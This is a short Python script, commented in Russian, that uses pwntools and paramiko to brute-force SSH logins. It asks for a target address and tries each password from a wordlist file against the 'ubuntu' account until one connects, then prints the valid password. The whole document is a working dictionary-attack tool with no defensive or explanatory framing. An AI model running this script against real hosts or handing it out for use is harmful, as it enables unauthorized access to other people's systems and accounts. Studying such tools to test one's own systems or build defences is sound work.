from pwn import *
import paramiko

host = input("Введите адрес цели\n")
username = "ubuntu"
attempts = 0

with open("passwords.txt", "r") as passwords_list: #Открываем файл с паролями
    for password in passwords_list:
        password = password.strip("\n") #Разделяем пароли из файла
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=2) #Пытаемся подключиться по ssh к хосту с помощью 1 из паролей

            if response.connected(): #Если получилось, выдаем в консоль подходящий пароль
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break

            response.close()
        except paramiko.ssh_exception.AuthenticationException: #Если не получилось, выдаем в консоль ошибку и пробуем снова
            print("Invalid password!")

        attempts += 1
